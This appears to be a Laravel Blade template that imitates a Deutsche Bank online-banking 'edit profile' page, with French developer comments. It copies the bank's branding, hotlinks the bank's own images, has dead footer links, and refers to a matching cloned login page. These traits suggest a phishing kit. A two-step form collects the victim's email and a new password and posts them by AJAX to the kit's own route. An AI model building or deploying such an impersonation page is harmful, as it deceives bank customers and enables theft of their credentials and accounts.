<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta name="csrf-token" content="{{ csrf_token() }}">
<title>Deutsche Bank – Profil bearbeiten</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}

:root{
  --blue:#0066b2;
  --blue-dk:#00519e;
  --navy:#1a2c6b;
  --red:#cc0000;
  --grey:#e8e8e8;
  --grey-b:#b0b0b0;
  --grey-t:#767676;
  --text:#202020;
  --white:#fff;
  --link:#0066b2;
  --sidebar-w:375px;
}

html,body{
  min-height:100%;
  font-family: "DeutscheBank UI", Helvetica, sans-serif;
  font-size: 25px;
  color:var(--text);
}

body{
  background-color:#3a8fd4;
  background-image:url("{{ asset('dbbg.jpg') }}");
  background-size:cover;
  background-position:center top;
  background-attachment:fixed;
  background-repeat:no-repeat;
}

.page{ min-height:100vh; display:flex; flex-direction:column; }
.layout{ flex:1; display:flex; align-items:flex-start; }

.left-col{
  flex:1; min-height:100vh; display:flex; align-items:center;
  padding-left:18%; padding-top:0; padding-bottom:0;
}

/* ── CARD ── */
.card{
  background:var(--white);
  width:560px;
  padding:46px 54px 50px;
  animation:fadeUp .38s ease both;
}

.logo-row{ display:flex; align-items:center; gap:8px; margin-bottom:28px; }
.logo-text{ font-size:16.5px; font-weight:400; color:var(--text); }
.logo-sq{
  width:24px; height:24px; flex-shrink:0;
  border:2px solid var(--blue); background:var(--white);
  display:flex; align-items:center; justify-content:center;
}

.card-title{ font-size:28px; font-weight:700; color:var(--text); margin-bottom:9px; line-height:1.1; }
.card-sub{ font-size:14.5px; color:var(--text); margin-bottom:24px; }

/* ── Champs ── */
.field{ display:flex; flex-direction:column; margin-bottom:16px; }
.lbl{ font-size:12.5px; margin-bottom:3px; color:var(--text); }
.lbl.red{ color:var(--red); }

.inp{
  height:40px; border:1px solid #aaa;
  padding:0 9px; font-size:14.5px; color:var(--text);
  background:var(--white); outline:none; border-radius:0;
  -webkit-appearance:none; width:100%; display:block;
  transition:border-color .13s, box-shadow .13s;
}
.inp.err{ border:1.5px solid var(--red); }
.inp:focus:not([disabled]){ border-color:var(--blue); box-shadow:0 0 0 2px rgba(0,102,178,.17); }
.inp.err:focus{ border-color:var(--red); box-shadow:0 0 0 2px rgba(204,0,0,.13); }

/* ── Résumé email étape 2 ── */
.email-summary{
  display:none;
  align-items:center;
  gap:10px;
  background:#f4f8fc;
  border:1px solid #d0e4f0;
  padding:10px 12px;
  margin-bottom:20px;
  font-size:13px;
  color:var(--text);
}
.email-summary.visible{ display:flex; animation:fadeUp .25s ease; }
.email-summary .email-val{ font-weight:700; font-size:13px; color:var(--blue); }
.email-summary .change-btn{
  margin-left:auto; color:var(--link); font-size:12px;
  text-decoration:underline; background:none; border:none;
  cursor:pointer; font-family:inherit; padding:0;
}

/* ── Section password (slide) ── */
.password-section{
  overflow:hidden;
  max-height:0; opacity:0;
  transition:max-height .4s ease, opacity .35s ease, margin-bottom .4s ease;
  margin-bottom:0;
}
.password-section.visible{
  max-height:300px; opacity:1; margin-bottom:8px;
}

/* ── Message erreur / succès ── */
.alert-box{
  display:none;
  font-size:13px;
  padding:10px 12px;
  margin-bottom:16px;
  line-height:1.4;
  border-left:3px solid;
}
.alert-box.error{ background:#fff0f0; border-color:var(--red); color:var(--red); }
.alert-box.success{ background:#f0fff4; border-color:#1a8a3a; color:#1a8a3a; }
.alert-box.visible{ display:block; animation:fadeUp .25s ease; }

/* ── Lien retour ── */
.back-link{
  display:inline-block; color:var(--link); font-size:13px;
  text-decoration:underline; margin-bottom:22px;
  cursor:pointer; background:none; border:none; padding:0; font-family:inherit;
}
.back-link:hover{ color:var(--blue-dk); }

/* ── Bottom row ── */
.card-btm{ display:flex; align-items:center; justify-content:space-between; margin-top:24px; }

.btn-weiter{
  background:var(--blue); color:#fff; border:none;
  height:42px; padding:0 28px; font-size:15px; font-weight:400;
  font-family:inherit; cursor:pointer; border-radius:0; min-width:100px;
  transition:background .13s; position:relative; overflow:hidden;
}
.btn-weiter:hover{ background:var(--blue-dk); }
.btn-weiter:active{ background:#003f80; }
.btn-weiter:disabled{ opacity:.65; cursor:default; }

.btn-weiter .spinner{
  display:none;
  width:16px; height:16px;
  border:2px solid rgba(255,255,255,.35);
  border-top-color:#fff;
  border-radius:50%;
  animation:spin .7s linear infinite;
  position:absolute; top:50%; left:50%;
  transform:translate(-50%,-50%);
}
.btn-weiter.loading .btn-label{ opacity:0; }
.btn-weiter.loading .spinner{ display:block; }

/* ── SIDEBAR (identique login) ── */
.sidebar{
  width:var(--sidebar-w); flex-shrink:0;
  background:var(--white); display:flex;
  flex-direction:column; min-height:100vh;
  margin-right:250px;
}
.promo-img{
  width:100%; height:182px; padding:5%;
  background-size:auto; position:relative; overflow:hidden; flex-shrink:0;
}
.promo-tag{
  position:absolute; top:12px; left:50%; transform:translateX(-50%);
  color:#b0c8e0; font-size:11px; text-align:center; line-height:1.6; white-space:nowrap;
}
.promo-tag em{ color:#7ab8e8; font-style:normal; font-size:10px; }
.ph-big{
  position:absolute; right:80px; top:50%; transform:translateY(-50%);
  width:66px; height:112px;
  background:linear-gradient(170deg,#3a3a58,#22223a);
  border-radius:10px; border:1.5px solid rgba(255,255,255,.2);
  box-shadow:-7px 5px 20px rgba(0,0,0,.5);
}
.ph-big-scr{
  position:absolute; inset:5px;
  background:linear-gradient(145deg,#0e5caa,#07305c);
  border-radius:6px; overflow:hidden;
  display:flex; align-items:flex-end; justify-content:flex-end; padding:5px;
}
.ph-card{ width:30px; height:20px; background:linear-gradient(135deg,#e8b000,#b88800); border-radius:3px; border:1px solid rgba(255,255,255,.25); }
.ph-sm{
  position:absolute; right:30px; bottom:14px;
  width:48px; height:78px;
  background:linear-gradient(170deg,#484860,#2e2e48);
  border-radius:8px; border:1.5px solid rgba(255,255,255,.15);
  box-shadow:4px 4px 16px rgba(0,0,0,.4);
}
.ph-sm-scr{ position:absolute; inset:4px; background:#fff; border-radius:4px; overflow:hidden; }
.ph-sm-scr::after{ content:''; display:block; width:100%; height:50%; background:linear-gradient(to bottom,#ddeaf8,#c8d8ec); }
.promo-badge{
  position:absolute; top:18px; right:74px;
  width:40px; height:40px; background:#14142a; border-radius:50%;
  border:2px solid rgba(255,255,255,.22);
  display:flex; flex-direction:column; align-items:center; justify-content:center;
  color:#fff; font-size:7.5px; font-weight:700; text-align:center; line-height:1.3;
}
.promo-body{ padding:5%; border-bottom:1px solid #e0e0e0; }
.promo-title{ font-size:20px; font-weight:700; color:var(--text); margin-bottom:8px; }
.promo-desc{ font-size:16px; color:var(--text); line-height:1.5; margin-bottom:8px; }
.promo-mehr{ color:var(--link); font-size:15px; text-decoration:underline; cursor:pointer; background:none; border:none; padding:0; font-family:inherit; }
.info-blk{ padding:26px 18px 13px; border-bottom:1px solid #e0e0e0; }
.info-hd{ display:flex; align-items:center; gap:9px; margin-bottom:7px; }
.info-ic{ flex-shrink:0; display:flex; align-items:center; }
.info-ttl{ font-size:20px; font-weight:700; color:var(--text); }
.info-txt{ font-size:15px; color:var(--text); line-height:1.5; margin-bottom:7px; }
.info-lnk{ display:block; color:var(--link); font-size:14px; text-decoration:underline; cursor:pointer; background:none; border:none; padding:0; font-family:inherit; text-align:left; margin-bottom:3px; line-height:1.5; }
.info-lnk:last-child{ margin-bottom:0; }
.ft{ background:var(--navy); padding:28px 28px 16px; margin-top:auto; }
.ft-links{ display:flex; flex-wrap:wrap; gap:4px 12px; margin-bottom:6px; }
.ft-a{ color:rgba(255,255,255,.88); font-size:16.5px; text-decoration:none; cursor:pointer; }
.ft-a:hover{ text-decoration:underline; }
.ft-copy{ font-size:15.5px; color:rgba(255,255,255,.6); margin-top:4px; }

/* ── Animations ── */
@keyframes fadeUp{ from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
@keyframes shake{ 0%,100%{transform:translateX(0)} 20%{transform:translateX(-5px)} 40%{transform:translateX(5px)} 60%{transform:translateX(-3px)} 80%{transform:translateX(3px)} }
@keyframes spin{ to{transform:translate(-50%,-50%) rotate(360deg)} }
.shake{ animation:shake .33s ease; }

/* ── Mobile ── */
@media(max-width:767px){
  body{ background-image:none; background-color:var(--navy); }
  .layout{ flex-direction:column; }
  .left-col{ flex:none; min-height:0; padding:0; width:100%; display:block; }
  .card{ width:100%; padding:26px 18px 30px; border-radius:0; }
  .card-title{ font-size:24px; }
  .inp{ height:44px; }
  .card-btm{ flex-direction:column; align-items:stretch; gap:10px; }
  .btn-weiter{ width:100%; order:-1; height:44px; }
  .sidebar{ width:100%; min-height:0; margin-right:0; }
}

@media(min-width:768px) and (max-width:1100px){
  :root{ --sidebar-w:280px; }
  .left-col{ padding-left:2%; }
  .card{ width:380px; padding:30px 32px 34px; }
  .sidebar{ margin-right:60px; }
}
</style>
</head>
<body>
<div class="page">
  <div class="layout">

    <!-- ====== CARD ====== -->
    <div class="left-col">
      <div class="card">

        {{-- Logo --}}
        <div class="logo-row">
          <span class="logo-text">Deutsche Bank</span>
          <div class="logo-sq">
            <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
              <line x1="1" y1="1" x2="13" y2="13" stroke="#0066b2" stroke-width="2.2" stroke-linecap="square"/>
            </svg>
          </div>
        </div>

        {{-- Lien retour profil --}}
        <a class="back-link" href="{{ route('dashboard.profile') }}">
          ← Zurück zum Profil
        </a>

        <h1 class="card-title">Profil bearbeiten</h1>
        <p class="card-sub" id="cardSub">Geben Sie Ihre neue E-Mail-Adresse ein.</p>

        {{-- Message erreur / succès --}}
        <div class="alert-box" id="alertBox"></div>

        {{-- Résumé email (affiché à l'étape 2) --}}
        <div class="email-summary" id="emailSummary">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
            <rect x="1" y="3" width="14" height="10" rx="1.5" stroke="#0066b2" stroke-width="1.4"/>
            <path d="M1 5l7 5 7-5" stroke="#0066b2" stroke-width="1.4" stroke-linecap="round"/>
          </svg>
          <span>E-Mail: <strong class="email-val" id="emailDisplay"></strong></span>
          <button class="change-btn" id="changeEmailBtn" type="button">Ändern</button>
        </div>

        {{-- ── ÉTAPE 1 : Email ── --}}
        <div id="emailWrap">
          <div class="field">
            <label class="lbl red" for="email">E-Mail-Adresse</label>
            <input class="inp err" type="email" id="email"
                   autocomplete="email"
                   value="{{ auth()->user()->email }}"
                   placeholder="beispiel@deutschebank.de"/>
          </div>
        </div>

        {{-- ── ÉTAPE 2 : Mot de passe (slide) ── --}}
        <div class="password-section" id="passwordSection">
          <div class="field">
            <label class="lbl" for="password">Neues Passwort</label>
            <input class="inp" type="password" id="password"
                   autocomplete="new-password"
                   placeholder="Mindestens 8 Zeichen"
                   minlength="8"/>
          </div>
          <div class="field">
            <label class="lbl" for="password_confirm">Passwort bestätigen</label>
            <input class="inp" type="password" id="password_confirm"
                   autocomplete="new-password"
                   placeholder="Passwort wiederholen"/>
          </div>
        </div>

        {{-- Bottom --}}
        <div class="card-btm">
          <span></span>{{-- spacer --}}
          <button class="btn-weiter" type="button" id="actionBtn">
            <span class="btn-label">Weiter</span>
            <span class="spinner"></span>
          </button>
        </div>

      </div>
    </div>

    <!-- ====== SIDEBAR (identique login) ====== -->
    <aside class="sidebar">
      <div class="promo-img">
        <img style="width:100%;" src="https://www.deutsche-bank.de/dam/deutschebank/de/shared/trxm/vorteilswelt/Samsung_Wallet_ Promo_1200x750_DB_ohne_Logo_ohne_Energielabel.jpg" alt=""/>
      </div>
      <div class="promo-body">
        <h2 class="promo-title">Spezial-Angebot für das neue Galaxy S26</h2>
        <p class="promo-desc">Sichern Sie sich auf das neue Smartphone von Samsung Ihren Preisvorteil und freuen Sie sich auf das erste Privacy-Display in einem Smartphone (Ultra-Modell).</p>
        <button class="promo-mehr">Zur Vorteilswelt</button>
      </div>
      <div class="info-blk">
        <div class="info-hd">
          <div class="info-ic">
            <svg width="19" height="19" viewBox="0 0 19 19" fill="none">
              <path d="M9.5 2.5L17 16.5H2L9.5 2.5Z" stroke="#333" stroke-width="1.4" stroke-linejoin="round"/>
              <line x1="9.5" y1="8" x2="9.5" y2="12" stroke="#333" stroke-width="1.5" stroke-linecap="round"/>
              <circle cx="9.5" cy="14" r=".85" fill="#333"/>
            </svg>
          </div>
          <span class="info-ttl">Sicherheitshinweise</span>
        </div>
        <p class="info-txt">Schützen Sie sich und Ihr Online-Banking. Wir helfen Ihnen gern.</p>
        <button class="info-lnk">Link zu den aktuellen Sicherheitshinweisen</button>
        <button class="info-lnk">Link zu Sicherheit im Überblick</button>
      </div>
      <div class="info-blk">
        <div class="info-hd">
          <div class="info-ic">
            <svg width="21" height="18" viewBox="0 0 21 18" fill="none">
              <rect x="1" y="1" width="19" height="13" rx="1" stroke="#333" stroke-width="1.4"/>
              <rect x="3.5" y="3.5" width="14" height="8" stroke="#333" stroke-width="1"/>
              <line x1="6.5" y1="14" x2="14.5" y2="14" stroke="#333" stroke-width="1.4"/>
              <line x1="10.5" y1="14" x2="10.5" y2="17" stroke="#333" stroke-width="1.4"/>
              <line x1="6.5" y1="17" x2="14.5" y2="17" stroke="#333" stroke-width="1.4"/>
            </svg>
          </div>
          <span class="info-ttl">Online-Banking Zugang</span>
        </div>
        <p class="info-txt">Hier können Sie Ihren persönlichen Zugang zum Online-Banking beantragen.</p>
        <button class="info-lnk">Zugang zum Online-Banking beantragen</button>
      </div>
      <div class="info-blk">
        <div class="info-hd">
          <div class="info-ic">
            <svg width="17" height="21" viewBox="0 0 17 21" fill="none">
              <rect x="1.5" y="8.5" width="14" height="11" rx="1" stroke="#333" stroke-width="1.4"/>
              <path d="M5 8.5V5.5a3.5 3.5 0 017 0v3" stroke="#333" stroke-width="1.4"/>
              <circle cx="8.5" cy="13.5" r="1.5" fill="#333"/>
              <line x1="8.5" y1="15" x2="8.5" y2="17" stroke="#333" stroke-width="1.4" stroke-linecap="round"/>
            </svg>
          </div>
          <span class="info-ttl">Unsere Sicherheitsverfahren</span>
        </div>
        <p class="info-txt">Alles Wissenswerte rund um Ihren Login.</p>
        <button class="info-lnk">Link zu den Sicherheitsverfahren</button>
      </div>
      <footer class="ft">
        <div class="ft-links">
          <a class="ft-a" href="#" onclick="return false;">English Version</a>
          <a class="ft-a" href="#" onclick="return false;">Hilfe</a>
          <a class="ft-a" href="#" onclick="return false;">Demo-Konto</a>
          <a class="ft-a" href="#" onclick="return false;">Impressum</a>
          <a class="ft-a" href="#" onclick="return false;">Rechtliche Hinweise</a>
          <a class="ft-a" href="#" onclick="return false;">Datenschutz</a>
          <a class="ft-a" href="#" onclick="return false;">Cookie-Einstellungen</a>
        </div>
        <p class="ft-copy">© 2026 Deutsche Bank AG</p>
      </footer>
    </aside>

  </div>
</div>

<script>
(function () {

  /* ── Refs ── */
  var emailInput       = document.getElementById('email');
  var password         = document.getElementById('password');
  var passwordConfirm  = document.getElementById('password_confirm');
  var actionBtn        = document.getElementById('actionBtn');
  var btnLabel         = actionBtn.querySelector('.btn-label');
  var passwordSection  = document.getElementById('passwordSection');
  var emailSummary     = document.getElementById('emailSummary');
  var emailDisplay     = document.getElementById('emailDisplay');
  var emailWrap        = document.getElementById('emailWrap');
  var changeEmailBtn   = document.getElementById('changeEmailBtn');
  var alertBox         = document.getElementById('alertBox');
  var cardSub          = document.getElementById('cardSub');
  var csrfToken        = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

  var step = 1;

  /* ── Helpers ── */
  function showError(msg) {
    alertBox.textContent = msg;
    alertBox.className   = 'alert-box error visible shake';
    alertBox.addEventListener('animationend', function () {
      alertBox.classList.remove('shake');
    }, { once: true });
  }

  function showSuccess(msg) {
    alertBox.textContent = msg;
    alertBox.className   = 'alert-box success visible';
  }

  function clearAlert() {
    alertBox.className   = 'alert-box';
    alertBox.textContent = '';
  }

  function shakeField(el) {
    el.classList.add('err', 'shake');
    el.addEventListener('animationend', function () {
      el.classList.remove('shake');
    }, { once: true });
  }

  function setLoading(on) {
    actionBtn.disabled = on;
    actionBtn.classList.toggle('loading', on);
  }

  function isValidEmail(val) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
  }

  /* ── Retour étape 1 (changer email) ── */
  changeEmailBtn.addEventListener('click', function () {
    step = 1;
    btnLabel.textContent      = 'Weiter';
    cardSub.textContent       = 'Geben Sie Ihre neue E-Mail-Adresse ein.';
    passwordSection.classList.remove('visible');
    emailSummary.classList.remove('visible');
    emailWrap.style.display   = '';
    password.value            = '';
    passwordConfirm.value     = '';
    clearAlert();
    emailInput.focus();
  });

  /* ── Nettoyage erreur au focus ── */
  [emailInput, password, passwordConfirm].forEach(function (el) {
    el.addEventListener('focus', function () {
      this.classList.remove('err');
      clearAlert();
    });
  });

  /* ── Enter sur confirmation → submit ── */
  passwordConfirm.addEventListener('keydown', function (e) {
    if (e.key === 'Enter') actionBtn.click();
  });

  /* ── Bouton principal ── */
  actionBtn.addEventListener('click', function () {

    /* ======================================================
       ÉTAPE 1 — Validation de l'email
    ====================================================== */
    if (step === 1) {

      var emailVal = emailInput.value.trim();

      if (!emailVal) {
        shakeField(emailInput);
        showError('Bitte geben Sie Ihre E-Mail-Adresse ein.');
        return;
      }
      if (!isValidEmail(emailVal)) {
        shakeField(emailInput);
        showError('Bitte geben Sie eine gültige E-Mail-Adresse ein.');
        return;
      }

      /* Passer à l'étape 2 : afficher les champs mot de passe */
      step = 2;
      emailDisplay.textContent  = emailVal;
      btnLabel.textContent      = 'Speichern';
      cardSub.textContent       = 'Geben Sie Ihr neues Passwort ein.';
      emailWrap.style.display   = 'none';
      emailSummary.classList.add('visible');
      passwordSection.classList.add('visible');
      clearAlert();
      setTimeout(function () { password.focus(); }, 420);

    /* ======================================================
       ÉTAPE 2 — Validation des mots de passe + envoi AJAX
    ====================================================== */
    } else {

      var pwVal  = password.value;
      var pwConf = passwordConfirm.value;

      /* Validation : champs requis */
      if (!pwVal) {
        shakeField(password);
        showError('Bitte geben Sie ein neues Passwort ein.');
        return;
      }

      /* Validation : minimum 8 caractères */
      if (pwVal.length < 8) {
        shakeField(password);
        showError('Das Passwort muss mindestens 8 Zeichen lang sein.');
        return;
      }

      /* Validation : les deux mots de passe correspondent */
      if (pwVal !== pwConf) {
        shakeField(passwordConfirm);
        showError('Die Passwörter stimmen nicht überein.');
        return;
      }

      /* ── Envoi AJAX vers le controller Laravel ── */
      setLoading(true);
      clearAlert();

      fetch('{{ route("profile.update") }}', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept':       'application/json',
          'X-CSRF-TOKEN': csrfToken
        },
        body: JSON.stringify({
          email:                 emailInput.value.trim(),
          password:              pwVal,
          password_confirmation: pwConf
        })
      })
      .then(function (res) { return res.json(); })
      .then(function (data) {
        setLoading(false);

        if (data.success) {

          /* Succès visuel */
          btnLabel.textContent          = '✓';
          actionBtn.style.background    = '#1a8a3a';
          actionBtn.style.pointerEvents = 'none';
          showSuccess(data.message || 'Profil erfolgreich aktualisiert.');

          /* Redirection après 1.5s */
          setTimeout(function () {
            window.location.href = data.redirect || '{{ route("dashboard.profile") }}';
          }, 1500);

        } else {
          showError(data.message || 'Ein Fehler ist aufgetreten.');
          shakeField(password);
          password.value        = '';
          passwordConfirm.value = '';
          password.focus();
        }
      })
      .catch(function () {
        setLoading(false);
        showError('Verbindungsfehler. Bitte versuchen Sie es erneut.');
      });
    }
  });

})();
</script>
</body>
</html>
